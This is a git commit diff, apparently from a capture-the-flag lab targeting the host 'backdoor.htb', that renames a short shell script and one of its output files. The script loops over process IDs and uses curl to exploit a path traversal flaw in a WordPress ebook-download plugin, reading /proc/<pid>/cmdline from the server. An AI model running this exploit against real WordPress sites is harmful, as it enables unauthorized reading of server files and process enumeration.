06f61709603b4b04bbdf4bc39549478efa1b107d
Mardcore7 <83950727+Mardcore7@users.noreply.github.com>
2023-01-05 00:04:05 +0100

    Update and rename proc.sh to lfi.sh

--- lfi.sh
+++ lfi.sh
@@ -4,5 +4,5 @@ for i in $(seq 1 2000);
   do curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php\?ebookdownloadurl=../../../../../../../../../proc/$i/cmdline | sed 's/cmdline/\n/g' | tail -n +4 | sed 's/<script>/\n/g' | head -n -1 >> proc;
 done
 
-cat proc | sed '/^ *$/d' > procesos
+cat proc | sed '/^ *$/d' > process
 rm proc
